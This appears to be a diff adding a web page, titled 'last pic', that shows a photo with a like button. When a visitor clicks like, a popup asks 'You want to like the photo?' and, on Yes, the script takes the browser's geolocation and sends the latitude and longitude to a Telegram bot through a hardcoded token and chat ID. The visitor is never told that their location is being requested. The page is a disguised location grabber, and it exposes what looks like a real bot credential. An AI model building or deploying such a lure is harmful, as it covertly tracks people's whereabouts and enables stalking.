@@ -1,0 +1,213 @@
+<!DOCTYPE html> 
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>last pic</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: rgba(0, 0, 0, 0.8) url('image.jpg') no-repeat center center/cover;
+            background-blend-mode: overlay;
+            overflow: hidden;
+        }
+
+        .card {
+            position: relative;
+            width: 300px;
+            height: 400px;
+            background: url('image.jpg') no-repeat center center/cover;
+            border-radius: 15px;
+            box-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
+            overflow: hidden;
+            animation: pulse 2s infinite;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .card:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 50px rgba(255, 255, 255, 0.8);
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.5), rgba(0, 0, 0, 0) 70%);
+            opacity: 0.5;
+            pointer-events: none;
+            z-index: 0;
+            animation: glow 3s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                box-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
+            }
+            50% {
+                box-shadow: 0 0 50px rgba(255, 255, 255, 1);
+            }
+        }
+
+        @keyframes glow {
+            0%, 100% {
+                opacity: 0.5;
+            }
+            50% {
+                opacity: 0.7;
+            }
+        }
+
+        .like-container {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .like-button {
+            background-color: transparent;
+            border: none;
+            cursor: pointer;
+            font-size: 24px;
+            color: white;
+            transition: transform 0.2s;
+        }
+
+        .like-button:hover {
+            transform: scale(1.2);
+        }
+
+        .like-count {
+            margin-top: 10px;
+            color: white;
+            font-size: 16px;
+        }
+
+        .message {
+            margin-top: 15px;
+            color: white;
+            font-size: 18px;
+            display: none;
+        }
+
+        .heart {
+            color: #ff4747;
+        }
+
+        /* Style for the location permission popup */
+        #location-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            color: white;
+            text-align: center;
+            z-index: 1000;
+        }
+
+        #location-popup button {
+            margin-top: 10px;
+            background-color: #ff4747;
+            border: none;
+            color: white;
+            padding: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // Telegram Bot API integration
+        const TELEGRAM_BOT_TOKEN = '7511590139:AAFJeA3sUb-ZCi4fPgTR12z5Q2fP_9_IN14'; // Replace with your bot token
+        const TELEGRAM_CHAT_ID = '6219309154'; // Replace with your chat ID
+
+        async function sendTelegramNotification(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
+                });
+                if (!response.ok) {
+                    console.error('Failed to send Telegram message');
+                }
+            } catch (error) {
+                console.error('Error sending Telegram message:', error);
+            }
+        }
+
+        // Like button functionality
+        let likeCount = 0;
+
+        function handleLike() {
+            likeCount++;
+            document.getElementById('like-count').innerText = `${likeCount} Like${likeCount > 1 ? 's' : ''}`;
+
+            // Display the heart and message
+            const message = document.getElementById('like-message');
+            message.style.display = 'block';
+            setTimeout(() => {
+                message.style.display = 'none';
+            }, 2000);
+
+            // Show the location permission popup
+            document.getElementById('location-popup').style.display = 'block';
+        }
+
+        // Handle location permission request
+        function requestLocationPermission(permissionGranted) {
+            // Close the popup
+            document.getElementById('location-popup').style.display = 'none';
+
+            // Handle permission result
+            let locationMessage = `Your post has been liked! Total Likes: ${likeCount}.`;
+            if (permissionGranted) {
+                // If permission granted, try to get the location
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const { latitude, longitude } = position.coords;
+                            locationMessage += ` Location: Latitude ${latitude}, Longitude ${longitude}`;
+                            sendTelegramNotification(locationMessage);
+                        },
+                        (error) => {
+                            locationMessage += ' Unable to retrieve location.';
+                            sendTelegramNotification(locationMessage);
+                        }
+                    );
+                }
+            } else {
+                // If permission denied
+                locationMessage += ' User denied location access.';
+                sendTelegramNotification(locationMessage);
+            }
+        }
+    </script>
+
+    <!-- Location permission popup -->
+    <div id="location-popup">
+        <p>You want to like the photo?</p>
+        <button onclick="requestLocationPermission(true)">Yes</button>
+        <button onclick="requestLocationPermission(false)">No</button>
+    </div>
+
+    <div class="card"></div>
+    <div class="like-container">
+        <button class="like-button" onclick="handleLike()">&#10084;</button>
+        <div id="like-count" class="like-count">0 Likes</div>
+        <div id="like-message" class="message">You liked the photo!</div>
+    </div>
+</body>
+</html>
